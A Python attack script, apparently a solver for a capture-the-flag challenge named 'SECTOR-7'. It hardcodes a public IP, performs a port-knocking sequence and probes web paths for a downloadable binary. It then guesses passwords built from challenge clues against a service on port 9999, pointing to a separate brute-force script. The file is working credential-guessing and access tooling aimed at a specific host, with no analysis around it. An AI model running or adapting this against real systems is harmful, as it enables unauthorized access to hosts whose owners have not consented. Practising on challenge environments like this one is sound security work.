#!/usr/bin/env python3
"""
Final SECTOR-7 Strategy
Try most likely passwords first, then check for binary download
"""

import socket
import time
import requests

TARGET_IP = "13.206.58.35"
WEB_URL = "http://13.206.58.35:8080"
KNOCK_SEQUENCE = [9000, 2600, 1337]
SERVICE_PORT = 9999

def knock_ports():
    """Perform port knocking"""
    for port in KNOCK_SEQUENCE:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((TARGET_IP, port))
            sock.close()
        except:
            pass
        time.sleep(0.2)

def try_password(password):
    """Try a single password"""
    try:
        knock_ports()
        time.sleep(0.3)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((TARGET_IP, SERVICE_PORT))
        
        # Receive banner
        banner = sock.recv(4096)
        
        # Send password
        sock.send((password + "\n").encode())
        time.sleep(0.3)
        
        # Get response
        response = sock.recv(4096)
        sock.close()
        
        resp_text = response.decode('utf-8', errors='ignore')
        
        # Check for success
        if "denied" not in resp_text.lower() and "incorrect" not in resp_text.lower():
            print(f"\n[+] Password '{password}' gave different response:")
            print(resp_text)
            return True
        
        return False
    except Exception as e:
        return False

def check_web_download():
    """Check if knocking opens a download link on web"""
    print("\n[*] Checking web service after knocking...")
    knock_ports()
    time.sleep(1)
    
    paths = ['/challenge', '/download', '/binary', '/kaal', '/file', '/get']
    
    for path in paths:
        try:
            r = requests.get(f"{WEB_URL}{path}", timeout=3)
            if r.status_code == 200:
                print(f"\n[+] {WEB_URL}{path} is accessible!")
                print(f"    Content-Type: {r.headers.get('Content-Type')}")
                
                if 'application' in r.headers.get('Content-Type', ''):
                    filename = f"sector7_binary{path.replace('/', '_')}"
                    with open(filename, 'wb') as f:
                        f.write(r.content)
                    print(f"[+] Saved binary to {filename}")
                    return filename
                else:
                    print(f"    Content:\n{r.text}")
        except:
            pass
    
    return None

def main():
    print("[*] SECTOR-7 Final Strategy")
    print(f"[*] Target: {TARGET_IP}\n")
    
    # First check if knocking gives us a binary
    binary = check_web_download()
    if binary:
        print(f"\n[+] Got binary: {binary}")
        print("[*] Analyze it with: strings, objdump, ghidra, etc.")
        return
    
    # Try most likely passwords based on clues
    print("\n[*] Trying high-probability passwords...")
    
    high_priority = [
        # Direct from clues
        "9000-2600-1337",
        "9000:2600:1337",
        "9000_2600_1337",
        "900026001337",
        
        # KAAL variations
        "KAAL9000",
        "kaal9000",
        "KAAL-9000",
        
        # Phone/IMEI
        "#06#",
        "06",
        
        # 2600 (most important hacker reference)
        "2600",
        "2600hz",
        
        # Over 9000
        "over9000",
        "9001",
        
        # Combinations
        "KAAL2600",
        "kaal2600",
        "sector72600",
        
        # Author
        "Glitch3r",
        "glitch3r",
    ]
    
    for pwd in high_priority:
        print(f"[*] Trying: {pwd}")
        if try_password(pwd):
            print(f"\n[!!!] SUCCESS! Password: {pwd}")
            return
        time.sleep(0.4)
    
    print("\n[-] High-priority passwords failed")
    print("[*] Run brute_sector7_password.py for comprehensive search")

if __name__ == "__main__":
    main()
